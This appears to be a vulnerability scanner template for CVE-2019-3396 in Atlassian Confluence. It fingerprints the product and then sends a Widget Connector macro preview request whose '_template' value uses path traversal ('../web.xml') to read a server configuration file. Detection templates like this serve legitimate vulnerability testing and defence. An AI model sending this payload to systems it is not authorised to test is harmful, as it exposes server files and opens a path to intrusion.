id: CVE-2019-3396
name: "Confluence Widget Connector SSRF/RCE"
severity: critical
description: "Atlassian Confluence Server Widget Connector macro allows SSRF and path traversal leading to remote code execution."
reference: CWE-22
confidence: tentative
requests:
  - method: GET
    path: "/"
    matchers:
      - type: body
        words:
          - "Confluence"
          - "Atlassian"
      - type: status
        status: [200]
    condition: and
  - method: POST
    path: "/rest/tinymce/1/macro/preview"
    headers:
      Content-Type: "application/json"
    body: '{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.daily.dev","width":"1000","height":"1000","_template":"../web.xml"}}}'
    matchers:
      - type: body
        words:
          - "web-app"
          - "servlet"
      - type: status
        status: [200]
    condition: and
